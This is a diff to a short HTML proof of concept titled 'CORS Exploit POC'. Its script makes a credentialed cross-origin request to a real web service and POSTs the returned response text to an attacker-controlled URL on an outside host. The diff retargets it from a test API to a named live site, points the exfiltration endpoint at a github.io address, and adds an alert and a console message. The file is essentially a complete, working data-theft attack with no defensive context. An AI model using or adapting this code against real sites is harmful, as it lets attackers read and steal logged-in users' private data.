@@ -6,7 +6,7 @@
 		<h1>CORS Exploit POC</h1>
 		<script>
 			var cors = new XMLHttpRequest();
-			var Victim_url = 'http://ip-api.com/json';
+			var Victim_url = 'https://alopeyk.com/alopost';
 			cors.open('GET', Victim_url, true);
 			cors.withCredentials = true;
 			cors.onload = reqListener;
@@ -15,11 +15,13 @@
 
 			function reqListener() {
 				var data = new XMLHttpRequest();
-				var attacker_url = 'http://a61a00a9.ngrok.io/bin/datafetch.py';
+				var attacker_url = 'https://callmehesam.github.io/attacker/bin/datafetch.py';
 				data.open('POST', attacker_url);
 				data.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 				data.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
 			};
+			alert(1);
+			console.log('karim bagheri');
 		</script>
 	</body>
 </html>
